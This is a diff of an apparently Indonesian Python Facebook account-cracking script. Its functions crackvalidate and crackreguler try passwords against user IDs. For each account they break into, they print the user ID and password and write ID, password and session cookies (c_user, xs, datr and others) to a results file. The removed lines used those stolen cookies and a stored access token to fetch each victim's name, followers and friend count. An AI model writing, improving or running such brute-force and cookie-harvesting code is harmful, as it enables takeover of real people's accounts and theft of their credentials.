@@ -824,21 +824,6 @@ def crackvalidate(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				token = open('.tok.txt','r').read()
-				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
-				response = requests.get(urlb)
-				data = response.json()
-				name = data.get('name')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				user=idf
-				session = requests.Session()
-				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-				except:teman = ""
-				print(f"\n⌲ Name: {hijo}{nama}{puti}")
-				print(f"⌲ Friends: {hijo}{teman}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -848,21 +833,6 @@ def crackvalidate(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				token = open('.tok.txt','r').read()
-				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
-				response = requests.get(urlb)
-				data = response.json()
-				name = data.get('name')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				user=idf
-				session = requests.Session()
-				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-				except:teman = ""
-				print(f"\n⌲ Name: {kun}{nama}{puti}")
-				print(f"⌲ Friends: {kun}{teman}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -938,21 +908,6 @@ def crackreguler(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				token = open('.tok.txt','r').read()
-				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
-				response = requests.get(urlb)
-				data = response.json()
-				name = data.get('name')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				user=idf
-				session = requests.Session()
-				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-				except:teman = ""
-				print(f"\n⌲ Name: {hijo}{nama}{puti}")
-				print(f"⌲ Friends: {hijo}{teman}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -962,21 +917,6 @@ def crackreguler(idf,pwx,url):
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				token = open('.tok.txt','r').read()
-				urlb = f"https://graph.facebook.com/{idf}?fields=name,followers&access_token={token}"
-				response = requests.get(urlb)
-				data = response.json()
-				name = data.get('name')
-				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				user=idf
-				session = requests.Session()
-				get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
-				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
-				try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
-				except:teman = ""
-				print(f"\n⌲ Name: {kun}{nama}{puti}")
-				print(f"⌲ Friends: {kun}{teman}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
